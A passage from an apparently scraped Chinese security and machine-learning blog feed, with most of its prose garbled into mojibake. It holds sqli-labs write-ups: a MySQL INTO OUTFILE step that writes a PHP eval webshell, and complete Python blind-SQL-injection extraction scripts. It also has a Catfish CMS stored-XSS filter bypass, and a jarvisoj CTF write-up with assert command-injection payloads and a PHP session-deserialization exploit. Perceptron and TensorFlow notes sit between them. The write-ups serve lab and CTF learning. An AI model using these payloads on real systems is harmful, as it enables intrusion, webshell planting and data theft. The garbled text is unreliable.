è¿™é‡Œæ˜¯å‡è®¾å†™å…¥åˆ°æ–‡ä»¶1ä¸­ã€‚åœ¨å®žé™…æµ‹è¯•ä¸­ï¼Œè¦outfileå‡ºçš„æ–‡ä»¶ä¸èƒ½å·²ç»å­˜åœ¨ï¼Œå¦åˆ™ä¼šæŠ¥é”™ã€‚12mysql&gt; select database() into outfile &apos;C:/phpstudy/WWW/test/1&apos;;ERROR 1086 (HY000): File &apos;C:/phpstudy/WWW/test/1&apos; already exists å†™å…¥webshelloutfileè¿˜å¯ä»¥ç”¨æ¥å†™å…¥webshellã€‚å‰ææ˜¯ï¼š éœ€è¦çŸ¥é“ç½‘ç«™çš„ç»å¯¹ç‰©ç†è·¯å¾„ï¼Œè¿™æ ·å¯¼å‡ºåŽçš„webshellå¯è®¿é—® å¯¹éœ€å¯¼å‡ºçš„ç›®å½•æœ‰å¯å†™æƒé™ã€‚ 12mysql&gt; select &quot;&lt;?php eval($_POST[&apos;chybeta&apos;])?&gt;&quot; into outfile &apos;C:/phpstudy/WWW/test/webshell.php&apos;;Query OK, 1 row affected (0.00 sec) Lees 7payload:1http://localhost:20000/sqllab/Less-7/?id=1&apos;)) union select 1,2,&apos;&lt;?php eval($_POST[&quot;chybeta&quot;]) ?&gt;&apos; into outfile &quot;C:\\phpstudy\\WWW\\test\\less7.php&quot; %23]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Sqli-Labs:Less5-6-writeup]]></title>
      <url>%2F2017%2F07%2F12%2FSqli-Labs-Less5-6-writeup%2F</url>
      <content type="text"><![CDATA[Sqli-Labsæ˜¯ç”¨æ¥ç»ƒä¹ sqlæ³¨å…¥çš„å¥½å¹³å°ã€‚projectåœ°å€ï¼šhttps://github.com/Audi-1/sqli-labsæœ¬æ–‡æµ‹è¯•çŽ¯å¢ƒï¼šä½¿ç”¨phpstudyé›†æˆçŽ¯å¢ƒã€‚mysqlç‰ˆæœ¬ï¼š5.5.53 Less5-6æ˜¯ç›²æ³¨ Less 5step1è®¿é—®1http://localhost:20000/sqllab/Less-5/?id=1 é¡µé¢æ­£å¸¸ï¼Œè¿”å›žï¼šYou are inâ€¦â€¦ step21http://localhost:20000/sqllab/Less-5/?id=1&apos; æŠ¥é”™ã€‚ä¹‹åŽçš„è¿‡ç¨‹è¦è®°å¾—é—­åˆå•å¼•å·ã€‚ step3ä¾æ¬¡è®¿é—®å¦‚ä¸‹é“¾æŽ¥ï¼š12http://localhost:20000/sqllab/Less-5/?id=1&apos; AND 1=1 --+http://localhost:20000/sqllab/Less-5/?id=1&apos; AND 1=2 --+ é¡µé¢è¿”å›žä¿¡æ¯ä¸åŒã€‚åŒæ—¶è¯•ç€ä½¿ç”¨UNION SELECTæ³¨å…¥ï¼Œ1http://localhost:20000/sqllab/Less-5/?id=&apos; UNION SELECT 1,2,3 --+ é¡µé¢è¿”å›ž You are inâ€¦â€¦è¿”å›žé€šç”¨é¡µé¢ã€‚æ•…è€ƒè™‘ç›²æ³¨ã€‚è¿™é‡Œä½¿ç”¨æŽ¨æ–­æ”»å‡»æŠ€æœ¯ï¼Œé€šè¿‡æŽ¨æ–­ä¸€æ¬¡ä¸€ä½åœ°é€æ­¥æå–ä¿¡æ¯ã€‚æ³¨å…¥ id=1â€™ AND (condition)åŽï¼Œé€šè¿‡é¡µé¢è¿”å›žçš„ä¿¡æ¯æ¥åˆ¤æ–­conditionçš„çœŸå‡ã€‚å½“conditionä¸ºçœŸæ—¶ï¼Œä¼šè¿”å›žåŒ…å«â€œYou are inâ€¦â€¦â€çš„æ­£å¸¸é¡µé¢ï¼Œå½“conditionä¸ºå‡æ—¶ï¼Œè¿”å›žç©ºé¡µé¢ã€‚ Exp1Condition12Condition Example:SUBSTRING((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT num1-1,1),num2,1) = char num1å’Œnum2éƒ½æ˜¯æ•´æ•°ï¼Œcharä¸ºå•ä¸ªå­—ç¬¦ã€‚ (SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT num1-1,1) ä¼šè¿”å›žæŸ¥è¯¢åˆ°ç»“æžœï¼ˆå³å„æ•°æ®åº“åç§°ï¼‰çš„ç¬¬num1è¡Œã€‚ SUBSTRING(*,num2,1) è¿”å›žæŸ¥è¯¢åŽç»“æžœçš„ç¬¬num2ä¸ªå­—æ¯ã€‚ SUBSTRING(*,num2,1) = a æ˜¯å¸ƒå°”è¡¨è¾¾å¼ï¼Œæ ¹æ®å…¶çœŸå‡ï¼Œé¡µé¢ä¼šè¿”å›žä¸åŒçš„ä¿¡æ¯ã€‚ Something é€šè¿‡ç±»ä¼¼çš„æ–¹æ³•ï¼Œå¯ä»¥å…ˆèŽ·å–æ•°æ®åº“çš„æ•°é‡ï¼Œå†æ ¹æ®æ•°é‡ä¾æ¬¡åˆ¤æ–­ã€‚ é€šè¿‡å˜åŒ–num1ï¼Œnum2ï¼Œcharï¼Œå¯ä»¥èŽ·å–åˆ°æœ€åŽçš„æ•°æ®ã€‚ å¤šæŸ¥è¯¢ä¸€ä½ï¼Œé€šè¿‡è¿”å›žçš„æœ€åŽä¸€ä½æ˜¯å¦ä¸ºç©ºæ ¼æ¥åˆ¤æ–­å½“å‰æ‰€æŸ¥è¯¢å­—ç¬¦ä¸²æ˜¯å¦å·²ç»ç»“æŸã€‚ Code12345678910111213141516171819202122232425262728293031323334353637383940414243444546import requestsimport stringdataset = " abcdefghijklmnopqrstuvwxyz_"querydata = "schema_name"querydb = "INFORMATION_SCHEMA"def sendPayload(payload): url = "http://localhost:20000/sqllab/Less-5/?id=1' "+ payload content = requests.get(url).text return contentdef findDatabaseNumber(): count = 1 while count: payload = "AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.SCHEMATA) =" payload = payload + str(count) + "--+" recv = sendPayload(payload) if "You are in" in recv: return count else: count += 1def getDatabaseName(dbNum): for k in range(dbNum): i = 1 result = "" while i : for j in dataset: querysql = "AND SUBSTRING((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT "+str(k)+",1),"+str(i)+",1)='"+j recv = sendPayload(querysql) if "You are in" in recv: if j != ' ': result += j i += 1 else: print result i = 0 breakdef exp(): dbNum = findDatabaseNumber() print "the number of database is "+str(dbNum) getDatabaseName(dbNum)exp() Result Exp2Exp1ä¸­ï¼Œæ˜¯åŸºäºŽå­—å…¸è¿›è¡ŒåŒ¹é…çš„ï¼Œæ•ˆçŽ‡ä½Žä¸‹ã€‚å¯ä»¥é‡‡ç”¨äºŒåˆ†æ³•æ¥è¿›è¡Œä¼˜åŒ–ã€‚å¤§ä½“æ€è·¯å¦‚ä¸Šè·ŸExp1ç›¸åŒã€‚ Condition12Condition Example:ASCII(SUBSTRING((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0 ,1), 1 ,1)) &gt; 127 åˆ¤æ–­å½“å‰ç¬¬ä¸€è¡Œçš„ç¬¬ä¸€ä¸ªå­—ç¬¦çš„asllç å€¼æ˜¯å¦å¤§äºŽ127ã€‚è‹¥è¯¥æ¡ä»¶ä¸ºçœŸï¼Œåˆ™å°†127æ›¿æ¢ä¸º 191 ï¼ˆå³ ï¼ˆ127+255ï¼‰/2ï¼‰ï¼Œè‹¥è¯¥æ¡ä»¶ä¸ºå‡ï¼Œåˆ™å°†127æ›¿æ¢ä¸º63ï¼ˆå³ï¼ˆ-1+127ï¼‰/2ï¼‰ Somethingåœ¨å†™äºŒåˆ†æ³•ç›²æ³¨æ—¶é‡åˆ°äº†ä¸€äº›é—®é¢˜ï¼Œæƒ³äº†ä¸€äº›ç­–ç•¥ï¼Œä½†ä¸çŸ¥é“æ˜¯ä¸æ˜¯æœ€å¥½çš„ã€‚å¦‚æžœæœ‰æ›´å¥½çš„åšæ³•ï¼Œå¸Œæœ›ç•™è¨€å‘ŠçŸ¥ æœç´¢èŒƒå›´é€‰æ‹©ï¼ˆ-1ï¼Œ255ï¼‰ï¼Œè¿™æ ·èƒ½åŒ…æ‹¬çš„å­—ç¬¦ASCIIå€¼xæ»¡è¶³ï¼š0â‰¤xâ‰¤255ã€‚å½“åˆ¤æ–­åˆ°æ‰€æŸ¥è¯¢å­—ç¬¦ä¸²ç»“å°¾æ—¶ï¼Œæ­¤æ—¶mysqlå¯¹åº”çš„ä¸æ˜¯ç©ºæ ¼ASCIIç 32ï¼Œè€Œæ˜¯0ã€‚å‡è®¾æ‰€æŸ¥è¯¢çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸²é•¿åº¦ä¸º10ï¼Œå½“æŸ¥è¯¢åˆ°å­—ç¬¦ä¸²å°¾éƒ¨åŽï¼ˆå³ç¬¬11ä¸ªå­—ç¬¦ï¼‰ï¼Œä¸‹é¢è¿™æ¡è¯­å¥æ˜¯æ’å‡çš„ï¼š12ASCII(SUBSTRING((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0 ,1), 11 ,1)) &gt; 0+ ç”±äºŽé‡‡ç”¨äº†é€’å½’äºŒåˆ†æ³•ã€‚è¿™é‡Œç”¨å…¨å±€å˜é‡findBitç”¨æ¥åˆ¤æ–­å½“å‰å­—ç¬¦ä¸²æ˜¯å¦æŸ¥è¯¢ç»“æŸï¼Œè‹¥findBitä¸º1ï¼Œè¡¨æ˜Žå·²ç»æŸ¥å®Œå¯ä»¥ç›´æŽ¥breakè·³åˆ°ä¸‹ä¸€ä¸ªæŸ¥è¯¢ã€‚ Code123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960import requestsimport stringimport sysquerydata = "schema_name"querydb = "INFORMATION_SCHEMA"global findBitdef sendPayload(payload): url = "http://localhost:20000/sqllab/Less-5/?id=1' "+ payload content = requests.get(url).text return contentdef findDatabaseNumber(): count = 1 while count: payload = "AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.SCHEMATA) =" payload = payload + str(count) + "--+" recv = sendPayload(payload) if "You are in" in recv: return count else: count += 1def getDatabaseName(dbNum): global findBit for k in range(dbNum): i = 1 while i : findBit = 0 doubleSearch(-1,255,i,k) i += 1 if findBit == 1: sys.stdout.write("\r\n") breakdef doubleSearch(leftNum,rightNum,i,k): global findBit midNum = (leftNum + rightNum) / 2 if (rightNum != leftNum +1): querysql = "AND ASCII(SUBSTRING((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT " + str(k) + ",1)," + str(i) + ",1)) &gt; " + str(midNum) + "--+" recv = sendPayload(querysql) if "You are in" in recv: doubleSearch(midNum,rightNum,i,k) else: doubleSearch(leftNum,midNum,i,k) else: if rightNum != 0: sys.stdout.write(chr(rightNum)) sys.stdout.flush() else: findBit = 1 returndef exp(): dbNum = findDatabaseNumber() print "the number of database is "+str(dbNum) getDatabaseName(dbNum)exp() Result Less 6Step1 1http://localhost:20000/sqllab/Less-6/?id=1&apos; æ— æŠ¥é”™ 1http://localhost:20000/sqllab/Less-6/?id=1&quot; é¡µé¢æŠ¥é”™ï¼Œè¿”å›žä¿¡æ¯ï¼š use near â€˜â€œ1â€â€ LIMIT 0,1â€™ at line 1ã€‚éœ€è¦é—­åˆåŒå¼•å·ã€‚ 1http://localhost:20000/sqllab/Less-6/?id=1&quot; AND 1=1 --+ é¡µé¢è¿”å›žæ­£å¸¸ 1http://localhost:20000/sqllab/Less-6/?id=1&quot; AND 1=2 --+ è¿”å›žé”™è¯¯é¡µé¢ï¼ˆç©ºç™½ï¼‰ Step2é‡‡ç”¨ç›²æ³¨ã€‚åˆ†æžåŒLess5ã€‚expå¦‚ä¸‹ï¼š12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061import requestsimport stringimport sysquerydata = "schema_name"querydb = "INFORMATION_SCHEMA"global findBitdef sendPayload(payload): url = 'http://localhost:20000/sqllab/Less-6/?id=1" '+ payload content = requests.get(url).text return contentdef findDatabaseNumber(): count = 1 while count: payload = "AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.SCHEMATA) =" payload = payload + str(count) + "--+" recv = sendPayload(payload) if "You are in" in recv: return count else: count += 1def getDatabaseName(dbNum): global findBit for k in range(dbNum): i = 1 while i : findBit = 0 doubleSearch(-1,255,i,k) i += 1 if findBit == 1: sys.stdout.write("\r\n") breakdef doubleSearch(leftNum,rightNum,i,k): global findBit midNum = (leftNum + rightNum) / 2 if (rightNum != leftNum +1): querysql = "AND ASCII(SUBSTRING((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT " + str(k) + ",1)," + str(i) + ",1)) &gt; " + str(midNum) + "--+" recv = sendPayload(querysql) if "You are in" in recv: doubleSearch(midNum,rightNum,i,k) else: doubleSearch(leftNum,midNum,i,k) else: if rightNum != 0: sys.stdout.write(chr(rightNum)) sys.stdout.flush() else: findBit = 1 returndef exp(): dbNum = findDatabaseNumber() print "the number of database is "+str(dbNum) getDatabaseName(dbNum)exp()]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Catfish(é²¶é±¼) CMS V 4.4.10 ç•™è¨€æ¿å­˜å‚¨åž‹XSSæ¼æ´ž]]></title>
      <url>%2F2017%2F07%2F11%2FCatfish-%E9%B2%B6%E9%B1%BC-CMS-V-4-4-10-%E7%95%99%E8%A8%80%E6%9D%BF%E5%AD%98%E5%82%A8%E5%9E%8BXSS%E6%BC%8F%E6%B4%9E%2F</url>
      <content type="text"><![CDATA[Catfish(é²¶é±¼) CMS V 4.4.10 ï¼šhttp://www.catfish-cms.com/ å®¡è®¡åœ¨...\application\index\controller\Index.phpä¸­ï¼Œå®šä¹‰äº†è¯„è®ºåŠŸèƒ½ã€‚ä»£ç å¦‚ä¸‹ï¼›1234567891011//æ·»åŠ è¯„è®º$data = [ 'post_id' =&gt; Request::instance()-&gt;post('id'), 'url' =&gt; 'index/Index/article/id/'.Request::instance()-&gt;post('id'), 'uid' =&gt; Session::get($this-&gt;session_prefix.'user_id'), 'to_uid' =&gt; $beipinglunren['post_author'], 'createtime' =&gt; date("Y-m-d H:i:s"), 'content' =&gt; $this-&gt;filterJs(Request::instance()-&gt;post('pinglun')), 'status' =&gt; $plzt];Db::name('comments')-&gt;insert($data); è¯„è®ºå†…å®¹contentåœ¨ç»è¿‡å‡½æ•°filterJsè¿‡æ»¤åŽæ’å…¥åˆ°æ•°æ®åº“ä¸­ã€‚ filterJså®šä¹‰åœ¨...\application\index\controller\Common.phpä¸­1234protected function filterJs($str)&#123; return preg_replace(['/&lt;script[\s\S]*?&lt;\/script&gt;/i','/&lt;style[\s\S]*?&lt;\/style&gt;/i'],'',$str);&#125; ä»…åšäº†ç®€å•çš„è¿‡æ»¤ï¼Œåªè¦æž„é€ ä¸‹åˆ—payloadå°±å¯ç»•è¿‡:1&lt;scr&lt;script&gt;&lt;/script&gt;ipt&gt;alert(document.cookie)&lt;/scr&lt;script&gt;&lt;/script&gt;ipt&gt; filterJsä¼šæŠŠ&lt;script&gt;**&lt;/script&gt;æ›¿æ¢ä¸ºç©ºï¼Œä»Žè€Œä½¿æ’å…¥åˆ°æ•°æ®åº“ä¸­çš„æ•°æ®å˜ä¸ºï¼š1&lt;script&gt;alert(document.cookie)&lt;/script&gt;æ›¿æ¢ä¸ºç©º éªŒè¯ä»¥æ™®é€šè´¦æˆ·userç™»é™†ï¼Œå¹¶å¯¹æ–‡ç« è¿›è¡Œè¯„è®º å› ä¸ºCatfish CMSåœ¨å‰ç«¯è¿›è¡Œäº†ä¸€æ¬¡ç¼–ç è¿‡æ»¤ï¼Œè‹¥æ˜¯ç›´æŽ¥åœ¨è¯„è®ºåŒºç›´æŽ¥æ’å…¥payloadä¼šè¢«ç¼–ç è½¬æ¢ã€‚æ‰€iæŠ“åŒ…ï¼Œå°†pinglunå‚æ•°æ”¹ä¸ºpayload adminç™»é™†åŽå°ï¼Œè§¦å‘XSSï¼š æŸ¥çœ‹æºä»£ç ï¼š]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[æ¸—é€æµ‹è¯•(1)ä¿¡æ¯æœé›†]]></title>
      <url>%2F2017%2F07%2F11%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-1-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%2F</url>
      <content type="text"><![CDATA[æœªå®Œ åŸŸååŸŸåæ³¨å†Œäººç­‰whoisåˆ©ç”¨whoisï¼Œå¯ä»¥æŸ¥è¯¢åŸŸåçš„ç›¸å…³è¯¦ç»†ä¿¡æ¯ã€‚åŒ…æ‹¬åŸŸåæ‰€æœ‰äººï¼ŒåŸŸåæ³¨å†Œæ—¥æœŸï¼Œè”ç³»æ–¹å¼ï¼Œé‚®ç®±ç­‰ç­‰ã€‚åœ¨ç¤¾ä¼šå·¥ç¨‹å­¦ã€ä»¥åŠåŽæœŸçš„æ¸—é€ä¸­èµ·åˆ°å¾ˆå¤§çš„ä½œç”¨ã€‚ http://whois.chinaz.com/ l å­åŸŸåçˆ†ç ´åŸŸä¼ é€æ¼æ´žå·¥å…·CDNç»•è¿‡æœç´¢å¼•æ“Žé«˜çº§æœç´¢æŠ€å·§ç½‘ç»œç»„ä»¶æœç´¢IPCæ®µIPåŒæœç«™ç‚¹ç‰¹æ®Šä¿¡æ¯æ³„éœ² github Reference æœ¬å±Œçš„webæ¼æ´žæ‰«æå™¨æ€è·¯ æŠ€å·§æ€»ç»“ï¼ˆåŸŸåä¿¡æ¯æ”¶é›†ç¯‡ï¼‰ å­åŸŸåçš„è‰ºæœ¯ ã€æ¸—é€ç¥žå™¨ç³»åˆ—ã€‘æœç´¢å¼•æ“Ž åŸŸæ¸—é€åŸºç¡€ç®€å•ä¿¡æ¯æ”¶é›†ï¼ˆåŸºç¡€ç¯‡ï¼‰ å†…ç½‘æ¸—é€å®šä½æŠ€æœ¯æ€»ç»“ åŽæ¸—é€æ”»é˜²çš„ä¿¡æ¯æ”¶é›† å®‰å…¨æ”»åŸŽå¸ˆç³»åˆ—æ–‡ç« ï¼æ•æ„Ÿä¿¡æ¯æ”¶é›† å­åŸŸåæžšä¸¾çš„è‰ºæœ¯ è®ºäºŒçº§åŸŸåæ”¶é›†çš„å„ç§å§¿åŠ¿ æˆ‘çœ¼ä¸­çš„æ¸—é€æµ‹è¯•ä¿¡æ¯æœé›† å¤§åž‹ç›®æ ‡æ¸—é€ï¼01å…¥ä¾µä¿¡æ¯æœé›†]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[æœºå™¨å­¦ä¹ ç®—æ³•:æ„ŸçŸ¥æœº(perceptron)]]></title>
      <url>%2F2017%2F07%2F08%2F%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95-%E6%84%9F%E7%9F%A5%E6%9C%BA-perceptron%2F</url>
      <content type="text"><![CDATA[æœºå™¨å­¦ä¹ ç®—æ³•:æ„ŸçŸ¥æœº(perceptron) å®šä¹‰å­¦ä¹ ç­–ç•¥é€ è½®å­åŽŸå§‹å½¢å¼1234567891011121314151617181920212223242526import matplotlib.pyplot as pltimport numpy as npf1 = plt.figure(1)data_set = np.array([[3,3,1],[4,3,1],[1,1,-1],[2,4,1],[0,0,-1],[2,0,-1],[6,1,-1]])plt.scatter(data_set[np.where(data_set[:,2] == 1)][:,0],data_set[np.where(data_set[:,2] == 1)][:,1],marker = 'x', color = 'm')plt.scatter(data_set[np.where(data_set[:,2] == -1)][:,0],data_set[np.where(data_set[:,2] == -1)][:,1],marker = 'o', color = 'g')length = len(data_set)rate = 1w = np.array([0,0])b = 0flag = Truex = np.linspace(-1,5,10)while flag == True : flag = False for i in range(length) : if ( data_set[i][2] * (w.dot(data_set[i,0:2]) + b )) &lt;= 0 : w = w + rate * data_set[i][2] * data_set[i,0:2] b = b + rate * data_set[i][2] flag = True print(w,b)plt.plot(x,(-b - w[0] * x) / w[1],'r')plt.show()print(w,b) è¾“å‡ºç»“æžœï¼š12345678910111213141516171819[3 3] 1[2 2] 0[2 2] -1[0 2] -2[-6 1] -3[-3 4] -2[1 7] -1[0 6] -2[-6 5] -3[-3 8] -2[-4 7] -3[-5 6] -4[-2 9] -3[-3 8] -4[-4 7] -5[ 0 10] -4[-1 9] -5[-2 8] -6[-3 7] -7 å¯¹å¶å½¢å¼]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Tensorflowå­¦ä¹ ï¼šå¸¸ç”¨API]]></title>
      <url>%2F2017%2F07%2F06%2FTensorflow%E5%AD%A6%E4%B9%A0%EF%BC%9A%E5%B8%B8%E7%94%A8API%2F</url>
      <content type="text"><![CDATA[è®°å½•å­¦ä¹ Tensorflowçš„ä¸€äº›ä¸œè¥¿ã€‚æœ¬æ–‡åŒæ­¥å‘è¡¨äºŽç”µå­ä¹¦The Path to Machine Learningã€‚å°†ä¼šæŒç»­ä¿æŒæ›´æ–°ã€‚ å¸¸ç”¨Mathæ“ä½œtf.random_normal()ä½œç”¨è¾“å‡ºæ»¡è¶³æ­£æ€åˆ†å¸ƒçš„éšæœºå€¼ è¯´æ˜Ž12345678random_normal( shape, mean=0.0, stddev=1.0, dtype=tf.float32, seed=None, name=None) shape:ä¸€ç»´æ•´æ•°å¼ é‡/pythonæ•°ç»„ï¼Œè¡¨ç¤ºè¾“å‡ºçš„å¼ é‡çš„å½¢çŠ¶ã€‚ meanï¼šç±»åž‹ä¸ºdtypeçš„é›¶ç»´å¼ é‡/pythonå€¼ã€‚å¹³å‡å€¼ã€‚ stddevï¼šç±»åž‹ä¸ºdtypeçš„é›¶ç»´å¼ é‡/pythonå€¼ã€‚æ ‡å‡†å·®ã€‚ dtypeï¼šè¾“å‡ºæ•°æ®çš„ç±»åž‹ã€‚ seedï¼šç”¨äºŽä½œä¸ºç”Ÿæˆéšæœºæ•°çš„ç§å­ã€‚ nameï¼šä¸ºæ“ä½œèµ·ä¸ªåå­—ï¼ˆå¯é€‰ï¼‰ tf.zeros()ä½œç”¨åˆ›å»ºä¸€ä¸ªæ‰€æœ‰å…ƒç´ éƒ½ä¸ºé›¶çš„å¼ é‡ã€‚ è¯´æ˜Ž12345zeros( shape, dtype=tf.float32, name=None) shape: ä¸€ç»´æ•´æ•°å¼ é‡/pythonæ•°ç»„ name: ä¸ºæ“ä½œèµ·ä¸ªåå­—ï¼ˆå¯é€‰ï¼‰ dtype: è¾“å‡ºæ•°æ®çš„ç±»åž‹ tf.global_variables_initializer()ä½œç”¨è¿”å›žä¸€ä¸ªåˆå§‹åŒ–å…¨å±€å˜é‡çš„æ“ä½œï¼ˆopï¼‰æ˜¯variable_initializer(global_variables())çš„ç¼©å†™ã€‚ tf.squareä½œç”¨è®¡ç®—å¹³æ–¹ è¯´æ˜Ž1234square( x, name=None) tf.reduce_meanä½œç”¨è®¡ç®—å¼ é‡æŸä¸€ç»´åº¦ä¸Šçš„å¹³å‡å€¼ è¯´æ˜Ž1234567reduce_mean( input_tensor, axis=None, keep_dims=False, name=None, reduction_indices=None) input_tensor:è¾“å…¥ä¸€ä¸ªå¼ é‡ axis:æŒ‡å®šæŸä¸€ä¸ªç»´åº¦ã€‚æ¯”å¦‚test = [[[1.0,2],[3,4]],[[5,6],[6,7]]]ï¼Œåˆ™å¯é€‰å€¼ä¸º0ï¼Œ1ï¼Œ2 keep_dimsï¼šè¾“å‡ºæ˜¯å¦ä¿æŒåŽŸæ¥çš„ç»´åº¦ã€‚ nameï¼šç»™æ“ä½œèµ·ä¸ªåå­— reduction_indicesï¼šaxisçš„æ—§åå­—ï¼Œä¸èµžæˆç”¨ï¼Œå¯å¿½ç•¥ã€‚ å¸¸ç”¨Optimizerç±»tf.train.GradientDescentOptimizer()123learning_rate: A Tensor or a floating point value. The learning rate to use.use_locking: If True use locks for update operations.name: Optional name prefix for the operations created when applying gradients. Defaults to &quot;GradientDescent&quot;.]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[jarvisoj-web-writeup]]></title>
      <url>%2F2017%2F07%2F05%2Fjarvisoj-web-writeup%2F</url>
      <content type="text"><![CDATA[jarvisoj-web-writeup babyphpä»¥å‰åšè¿‡ã€‚æŒ‰ç†è¯´åº”è¯¥æœ‰gitæ³„éœ²çš„..è¿™æ¬¡æ­»æ´»æ‰¾ä¸åˆ°ï¼šï¼‰ã€‚é€šè¿‡gitæ³„éœ²å‡ºæ¥çš„index.phpæºç å¦‚ä¸‹ï¼š1234567891011121314151617&lt;?phpif (isset($_GET['page'])) &#123; $page = $_GET['page'];&#125; else &#123; $page = "home";&#125;$file = "templates/" . $page . ".php";// I heard '..' is dangerous!assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");// TODO: Make this look niceassert("file_exists('$file')") or die("That file doesn't exist!");?&gt; å…¶ä¸­assertæ˜¯ä¸ªå±é™©å‡½æ•°ï¼Œå…¶åŽŸåž‹ä¸º1bool assert ( mixed $assertion [, string $description ] ) å¦‚æžœ assertion æ˜¯å­—ç¬¦ä¸²ï¼Œå®ƒå°†ä¼šè¢« assert() å½“åš PHP ä»£ç æ¥æ‰§è¡Œã€‚payload1ï¼š1http://web.jarvisoj.com:32798/?page=flag&apos;.system(&quot;ls templates/;&quot;).&apos; payload21http://web.jarvisoj.com:32798/?page=flag&apos;.system(&quot;cat templates/flag.php;&quot;).&apos; å¾—åˆ°flag:161dctf&#123;8e_careful_when_us1ng_ass4rt&#125; å…¶å®žè¿™æ˜¯CSAW2016åŽŸé¢˜.. adminæ‰«åˆ°robots.txtå‘çŽ°Disallow: /admin_s3cr3t.phpã€‚è®¿é—®å¹¶ç”¨burpæŠ“åŒ…ï¼Œå¦‚ä¸‹ï¼š åœ¨cookieå­—æ®µåŠ ä¸Šadmin=1ï¼Œå¾—åˆ°flagï¼š1flag&#123;hello_admin~&#125; WEB?PHPINFOé¢˜ç›®å…¥å£ï¼šhttp://web.jarvisoj.com:32784/é¢˜ç›®æºç ï¼š1234567891011121314151617181920212223242526&lt;?php//A webshell is wait for youini_set('session.serialize_handler', 'php');session_start();class OowoO&#123; public $mdzz; function __construct() &#123; $this-&gt;mdzz = 'phpinfo();'; &#125; function __destruct() &#123; eval($this-&gt;mdzz); &#125;&#125;if(isset($_GET['phpinfo']))&#123; $m = new OowoO();&#125;else&#123; highlight_string(file_get_contents('index.php'));&#125;?&gt; session.serialize_handlerå®¹æ˜“æƒ³åˆ°wooyunä¸Šçš„æ–‡ç« ã€ŠPHP Session åºåˆ—åŒ–åŠååºåˆ—åŒ–å¤„ç†å™¨è®¾ç½®ä½¿ç”¨ä¸å½“å¸¦æ¥çš„å®‰å…¨éšæ‚£ã€‹ã€‚é€šè¿‡phpinfoé¡µé¢ï¼Œæˆ‘ä»¬çŸ¥é“php.iniä¸­é»˜è®¤session.serialize_handlerä¸ºphp_serializeï¼Œè€Œindex.phpä¸­å°†å…¶è®¾ç½®ä¸ºphpã€‚è¿™å°±å¯¼è‡´äº†seesionçš„ååºåˆ—åŒ–é—®é¢˜ã€‚ ç”±phpinfo()é¡µé¢çŸ¥ï¼Œsession.upload_progress.enabledä¸ºOnã€‚å½“ä¸€ä¸ªä¸Šä¼ åœ¨å¤„ç†ä¸­ï¼ŒåŒæ—¶POSTä¸€ä¸ªä¸ŽINIä¸­è®¾ç½®çš„session.upload_progress.nameåŒåå˜é‡æ—¶ï¼Œå½“PHPæ£€æµ‹åˆ°è¿™ç§POSTè¯·æ±‚æ—¶ï¼Œå®ƒä¼šåœ¨$_SESSIONä¸­æ·»åŠ ä¸€ç»„æ•°æ®ã€‚æ‰€ä»¥å¯ä»¥é€šè¿‡Session Upload Progressæ¥è®¾ç½®sessionã€‚å¯ä»¥çœ‹çœ‹è¿™é‡Œï¼šæœ‰è¶£çš„phpååºåˆ—åŒ–æ€»ç»“ å…ˆæŠŠä¸‹é¢ä»£ç ä¿å­˜ä¸ºtest.htmlã€‚12345&lt;form action="http://web.jarvisoj.com:32784/index.php" method="POST" enctype="multipart/form-data"&gt; &lt;input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="123" /&gt; &lt;input type="file" name="file" /&gt; &lt;input type="submit" /&gt;&lt;/form&gt; æŽ¥ä¸‹æ¥è€ƒè™‘åºåˆ—åŒ–çš„é—®é¢˜ã€‚1234567891011&lt;?phpini_set('session.serialize_handler', 'php_serialize');session_start();&lt;?phpclass OowoO&#123; public $mdzz='xxxxx';&#125;$obj = new OowoO();echo serialize($obj);?&gt; payloay1:å°†xxxxxæ›¿æ¢ä¸ºprint_r(scandir(dirname(__FILE__)));,å¾—åˆ°åºåˆ—åŒ–ç»“æžœï¼š1O:5:"OowoO":1:&#123;s:4:"mdzz";s:36:"print_r(scandir(dirname(__FILE__)));";&#125; ä¸ºé˜²æ­¢è½¬ä¹‰ï¼Œåœ¨å¼•å·å‰åŠ ä¸Š\ã€‚åˆ©ç”¨å‰é¢çš„htmlé¡µé¢éšä¾¿ä¸Šä¼ ä¸€ä¸ªä¸œè¥¿ï¼ŒæŠ“åŒ…ï¼ŒæŠŠfilenameæ”¹ä¸ºå¦‚ä¸‹ï¼š1|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:36:\&quot;print_r(scandir(dirname(__FILE__)));\&quot;;&#125; æ³¨æ„ï¼Œå‰é¢æœ‰ä¸€ä¸ª|ï¼Œè¿™æ˜¯sessionçš„æ ¼å¼ã€‚ æŽ¥ä¸‹æ¥å°±æ˜¯åŽ»è¯»å– Here_1s_7he_fl4g_buT_You_Cannot_see.phpç”±phpinfoå¯çŸ¥å½“å‰çš„è·¯å¾„ä¸º/opt/lampp/htdocs/ å°†xxxå¤„æ”¹ä¸ºï¼š1print_r(file_get_contents(&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php&quot;)); 